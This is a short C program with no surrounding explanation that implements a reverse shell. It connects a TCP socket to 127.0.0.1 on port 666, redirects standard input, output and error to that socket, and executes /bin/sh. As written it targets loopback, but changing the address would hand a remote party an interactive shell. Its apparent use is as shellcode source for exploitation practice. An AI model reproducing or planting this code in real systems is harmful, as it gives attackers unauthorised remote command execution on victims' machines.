#include<unistd.h>
#include<sys/socket.h>
#include<netinet/in.h>

int soc,rc;
struct sockaddr_in serv_addr;

int main()
{
  serv_addr.sin_family = AF_INET;
  serv_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
  serv_addr.sin_port = htons(666);
  soc=socket(AF_INET, SOCK_STREAM, 0);
  rc = connect(soc, (struct sockaddr*)&serv_addr, sizeof(serv_addr));
  dup2(soc, 0);
  dup2(soc, 1);
  dup2(soc, 2);
  execl("/bin/sh", "sh", 0);
}
